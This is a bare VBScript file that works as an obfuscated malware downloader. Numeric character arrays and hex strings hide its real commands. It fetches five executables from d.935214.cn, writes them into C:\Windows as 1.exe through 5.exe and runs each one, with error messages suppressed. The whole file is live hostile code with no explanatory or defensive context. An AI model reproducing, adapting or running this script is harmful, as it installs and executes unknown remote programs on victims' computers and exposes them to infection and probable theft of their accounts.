On Error Resume Next
Set Post = CreateObject("Msxml2.XMLHTTP")
Set Shell = CreateObject("Wscript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists("C:\���ǲ��ӿ�.exe") Then fso.DeleteFile ("C:\���ǲ��ӿ�.exe")
If fso.FileExists("c:\a.vbs") Then fso.DeleteFile ("c:\a.vbs")
Str = Array(80,111,115,116,46,79,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,100,46,57,51,53,50,49,52,46,99,110,47,109,109,47,122,116,46,101,120,101,34,44,48)
Function Num2Str(Str):For I=0 To UBound(Str):Num2Str = Num2Str & Chr(Str(I)):Next:End Function
Execute Num2Str(Str)
Post.Send()
Set aGet = CreateObject("ADODB.Stream")
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
S="614765742E577269746528506F73742E726573706F6E7365426F647929":D="EXECUTE """"":C="&CHR(&H":N=")":DO WHILE LEN(S)>1:IF ISNUMERIC(LEFT(S,1)) THEN D=D&C&LEFT(S,2)&N:S=MID(S,3) ELSE D=D&C&LEFT(S,4)&N:S=MID(S,5)
LOOP:EXECUTE D
aGet.SaveToFile "c:\windows\1.exe",2
wscript.sleep 1000
Shell.Run ("c:\windows\1.exe")
Str = Array(80,111,115,116,46,79,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,100,46,57,51,53,50,49,52,46,99,110,47,109,109,47,109,104,46,101,120,101,34,44,48)
Function Num2Str(Str):For I=0 To UBound(Str):Num2Str = Num2Str & Chr(Str(I)):Next:End Function
Execute Num2Str(Str)
Post.Send()
Set aGet = CreateObject("ADODB.Stream")
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
S="614765742E577269746528506F73742E726573706F6E7365426F647929":D="EXECUTE """"":C="&CHR(&H":N=")":DO WHILE LEN(S)>1:IF ISNUMERIC(LEFT(S,1)) THEN D=D&C&LEFT(S,2)&N:S=MID(S,3) ELSE D=D&C&LEFT(S,4)&N:S=MID(S,5)
LOOP:EXECUTE D
aGet.SaveToFile "c:\windows\2.exe",2
wscript.sleep 1000
Shell.Run ("c:\windows\2.exe")
Str = Array(80,111,115,116,46,79,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,100,46,57,51,53,50,49,52,46,99,110,47,109,109,47,119,111,119,46,101,120,101,34,44,48)
Function Num2Str(Str):For I=0 To UBound(Str):Num2Str = Num2Str & Chr(Str(I)):Next:End Function
Execute Num2Str(Str)
Post.Send()
Set aGet = CreateObject("ADODB.Stream")
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
S="614765742E577269746528506F73742E726573706F6E7365426F647929":D="EXECUTE """"":C="&CHR(&H":N=")":DO WHILE LEN(S)>1:IF ISNUMERIC(LEFT(S,1)) THEN D=D&C&LEFT(S,2)&N:S=MID(S,3) ELSE D=D&C&LEFT(S,4)&N:S=MID(S,5)
LOOP:EXECUTE D
aGet.SaveToFile "c:\windows\3.exe",2
wscript.sleep 1000
Shell.Run ("c:\windows\3.exe")
Str = Array(80,111,115,116,46,79,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,100,46,57,51,53,50,49,52,46,99,110,47,109,109,47,119,109,46,101,120,101,34,44,48)
Function Num2Str(Str):For I=0 To UBound(Str):Num2Str = Num2Str & Chr(Str(I)):Next:End Function
Execute Num2Str(Str)
Post.Send()
Set aGet = CreateObject("ADODB.Stream")
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
S="614765742E577269746528506F73742E726573706F6E7365426F647929":D="EXECUTE """"":C="&CHR(&H":N=")":DO WHILE LEN(S)>1:IF ISNUMERIC(LEFT(S,1)) THEN D=D&C&LEFT(S,2)&N:S=MID(S,3) ELSE D=D&C&LEFT(S,4)&N:S=MID(S,5)
LOOP:EXECUTE D
aGet.SaveToFile "c:\windows\4.exe",2
wscript.sleep 1000
Shell.Run ("c:\windows\4.exe")
Str = Array(80,111,115,116,46,79,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,100,46,57,51,53,50,49,52,46,99,110,47,109,109,47,119,108,46,101,120,101,34,44,48)
Function Num2Str(Str):For I=0 To UBound(Str):Num2Str = Num2Str & Chr(Str(I)):Next:End Function
Execute Num2Str(Str)
Post.Send()
Set aGet = CreateObject("ADODB.Stream")
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
S="614765742E577269746528506F73742E726573706F6E7365426F647929":D="EXECUTE """"":C="&CHR(&H":N=")":DO WHILE LEN(S)>1:IF ISNUMERIC(LEFT(S,1)) THEN D=D&C&LEFT(S,2)&N:S=MID(S,3) ELSE D=D&C&LEFT(S,4)&N:S=MID(S,5)
LOOP:EXECUTE D
aGet.SaveToFile "c:\windows\5.exe",2
wscript.sleep 1000
Shell.Run ("c:\windows\5.exe")
